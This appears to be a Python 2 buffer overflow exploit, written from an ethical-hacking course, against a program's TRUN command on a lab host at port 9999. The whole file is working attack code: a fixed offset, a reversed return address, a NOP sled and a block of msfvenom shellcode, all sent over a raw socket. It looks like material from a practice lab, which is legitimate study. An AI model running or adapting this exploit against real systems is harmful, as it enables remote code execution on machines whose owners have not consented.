#!/usr/bin/python2
#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section

import sys, socket

#Target IP
RHOST = '192.168.50.13'
#Target port
RPORT = 9999
#Vulnerable command of program
COMM = 'TRUN /.:/'
#Discovered offset (final number from simplefuzzer tool output)
OFFSET = 2003
#Character to use for buffer
BUFFCHAR = 'A'
#Discovered return address (in reverse- if it was 00 01 02[\x00\x01\x02] JMP would be \x02\x01\x00
JMP = '\xaf\x11\x50\x62'

# Adding padding (NOP)- sometimes it needs to be smaller (*16 or *8)
NOP = "\x90" * 32

#Adding shellcode for exploitation (payload from msfvenom)
OVERFLOW = (
"\xb8\x79\x6d\x1b\x14\xd9\xe8\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xba\x69\xf9\xe1\xc0\x9a\x7f"
"\x09\x38\x5b\xe0\x83\xdd\x6a\x20\xf7\x96\xdd\x90\x73\xfa\xd1"
"\x5b\xd1\xee\x62\x29\xfe\x01\xc2\x84\xd8\x2c\xd3\xb5\x19\x2f"
"\x57\xc4\x4d\x8f\x66\x07\x80\xce\xaf\x7a\x69\x82\x78\xf0\xdc"
"\x32\x0c\x4c\xdd\xb9\x5e\x40\x65\x5e\x16\x63\x44\xf1\x2c\x3a"
"\x46\xf0\xe1\x36\xcf\xea\xe6\x73\x99\x81\xdd\x08\x18\x43\x2c"
"\xf0\xb7\xaa\x80\x03\xc9\xeb\x27\xfc\xbc\x05\x54\x81\xc6\xd2"
"\x26\x5d\x42\xc0\x81\x16\xf4\x2c\x33\xfa\x63\xa7\x3f\xb7\xe0"
"\xef\x23\x46\x24\x84\x58\xc3\xcb\x4a\xe9\x97\xef\x4e\xb1\x4c"
"\x91\xd7\x1f\x22\xae\x07\xc0\x9b\x0a\x4c\xed\xc8\x26\x0f\x7a"
"\x3c\x0b\xaf\x7a\x2a\x1c\xdc\x48\xf5\xb6\x4a\xe1\x7e\x11\x8d"
"\x06\x55\xe5\x01\xf9\x56\x16\x08\x3e\x02\x46\x22\x97\x2b\x0d"
"\xb2\x18\xfe\x82\xe2\xb6\x51\x63\x52\x77\x02\x0b\xb8\x78\x7d"
"\x2b\xc3\x52\x16\xc6\x3e\x35\xd9\xbf\x10\x45\xb1\xbd\x90\x54"
"\x1e\x4b\x76\x3c\x8e\x1d\x21\xa9\x37\x04\xb9\x48\xb7\x92\xc4"
"\x4b\x33\x11\x39\x05\xb4\x5c\x29\xf2\x34\x2b\x13\x55\x4a\x81"
"\x3b\x39\xd9\x4e\xbb\x34\xc2\xd8\xec\x11\x34\x11\x78\x8c\x6f"
"\x8b\x9e\x4d\xe9\xf4\x1a\x8a\xca\xfb\xa3\x5f\x76\xd8\xb3\x99"
"\x77\x64\xe7\x75\x2e\x32\x51\x30\x98\xf4\x0b\xea\x77\x5f\xdb"
"\x6b\xb4\x60\x9d\x73\x91\x16\x41\xc5\x4c\x6f\x7e\xea\x18\x67"
"\x07\x16\xb9\x88\xd2\x92\xd9\x6a\xf6\xee\x71\x33\x93\x52\x1c"
"\xc4\x4e\x90\x19\x47\x7a\x69\xde\x57\x0f\x6c\x9a\xdf\xfc\x1c"
"\xb3\xb5\x02\xb2\xb4\x9f"
)
TEST = BUFFCHAR * OFFSET + JMP + NOP + OVERFLOW

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.send((COMM + TEST))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
